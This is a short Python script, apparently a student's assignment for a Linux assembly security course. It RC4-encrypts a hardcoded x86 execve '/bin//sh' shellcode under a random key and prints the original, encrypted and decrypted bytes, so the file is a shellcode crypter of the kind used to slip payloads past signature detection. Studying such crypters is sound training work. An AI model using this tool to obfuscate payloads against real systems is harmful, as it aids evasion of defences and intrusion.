#!/usr/bin/python3
'''
Filename:   encrypter.py
Author:     aus-mate
Purpose:    This code was written for assignment #7 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
from Crypto.Cipher import ARC4
from os import urandom

shellcode = bytes("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')

print ("\nOriginal: " + "".join("0x%02x," % i for i in shellcode))

key = urandom(16)
enc_cipher = ARC4.new(key)

dec_cipher = ARC4.new(key)

enc_shellcode = enc_cipher.encrypt(shellcode)
print("\nKey: " + "".join("0x%02x," % i for i in key))
print("\nEncrypted: " + "".join("0x%02x," % i for i in enc_shellcode))
print("\nEncrypted length: " + str(hex(len(enc_shellcode))))

dec_shellcode = dec_cipher.decrypt(enc_shellcode)
print("\nDecrypted: " + "".join("0x%02x," % i for i in dec_shellcode))
